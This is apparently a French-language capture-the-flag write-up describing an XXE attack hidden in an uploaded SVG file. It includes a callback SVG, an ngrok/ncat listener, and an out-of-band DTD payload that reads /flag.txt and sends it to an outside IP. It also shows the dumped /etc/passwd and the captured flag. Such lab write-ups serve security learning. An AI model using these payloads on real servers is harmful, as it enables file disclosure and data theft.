# Step 3 

> faut trouver le /flag.txt

> découverte du hint: svg -> xxe

## XXE inside SVG

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg

### Chopper une requete chez soit

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="http://77ff5a3f.ngrok.io/"></image>
</svg>
```

```bash
# term 1
ngrok http 12345

# term 2
ncat -klvp 12345
```

Output : 

```
GET / HTTP/1.1
Host: 77ff5a3f.ngrok.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-Proto: https
X-Forwarded-For: 90.63.252.100
```

### XXE SVG OOB

* ro.svg

```xml
<!DOCTYPE svg [
<!ENTITY % file SYSTEM "http://51.158.113.8/ro.dtd">
%file;%template;
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="30">Injected: &res;</text>
</svg>
```

* ro.dtd

```xml
<!ENTITY % secret1 SYSTEM "file:///flag.txt">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

faut upload `ro.svg` : http://willywonka.shop/profile?filetype=image%2fsvg%2bxml
faut changer le mime type

j'ai mis `aas` en nom de victime et du random après

apres c'est tu c/c le ticket id et go autoresize

* /etc/passwd

```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

* flag

```
Invalid URI: http://51.158.113.8/?data=0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630
```